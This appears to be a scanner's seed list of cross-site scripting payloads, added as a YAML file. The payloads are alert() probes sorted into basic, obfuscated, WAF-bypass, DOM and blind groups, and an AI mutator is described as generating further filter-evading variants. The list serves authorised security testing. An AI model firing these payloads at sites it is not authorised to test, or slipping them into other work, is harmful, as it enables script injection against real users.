@@ -1,0 +1,53 @@
+# XSS payloads — seed list for the XSS agent
+# The LLM mutator generates additional variants and bypasses based on observed responses.
+#
+# Categories:
+#   basic      — standard probes, highest detection rate against unprotected targets
+#   obfuscation — encoding/casing tricks to bypass simple string matching
+#   bypass     — WAF and filter evasion techniques
+#   dom        — payloads targeting client-side sinks (innerHTML, document.write, eval)
+#   blind      — payloads for stored/blind XSS where the sink is on a different page
+
+payloads:
+  basic:
+    - '<img src=x onerror=alert(1)>'
+    - '"><script>alert(1)</script>'
+    - "';alert(1)//"
+    - '<svg onload=alert(1)>'
+    - '<body onload=alert(1)>'
+    - '"><img src=x onerror=alert(1)>'
+
+  obfuscation:
+    - '<ScRiPt>alert(1)</ScRiPt>'
+    - '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>'
+    - '<svg/onload=alert(1)>'
+    - '"><svg onload=alert&#40;1&#41;>'
+    - '<img src=x onerror=alert(1)>'
+    - "javascript:alert`1`"
+    - '<iframe src=javascript:alert(1)>'
+
+  bypass:
+    - '<img src=x oNeRrOr=alert(1)>'
+    - '<<script>alert(1)//<</script>'
+    - '<script>alert(String.fromCharCode(88,83,83))</script>'
+    - '" autofocus onfocus=alert(1) x="'
+    - "' autofocus onfocus=alert(1) x='"
+    - '<details open ontoggle=alert(1)>'
+    - '<input onfocus=alert(1) autofocus>'
+    - '<!--<img src=x onerror=alert(1)>-->'
+    - '<xss onmouseover=alert(1)>hover</xss>'
+
+  dom:
+    - 'javascript:alert(document.domain)'
+    - '#"><img src=x onerror=alert(1)>'
+    - 'data:text/html,<script>alert(1)</script>'
+
+  blind:
+    # These use a unique marker so the browser validator can detect execution
+    # even when the sink is on a different page (stored XSS)
+    - '<img src=x onerror=alert("DAST_XSS_CONFIRM")>'
+    - '<script>alert("DAST_XSS_CONFIRM")</script>'
+    - '<svg onload=alert("DAST_XSS_CONFIRM")>'
+
+# Confirmation marker injected into blind payloads — browser validator looks for this
+confirm_marker: "DAST_XSS_CONFIRM"
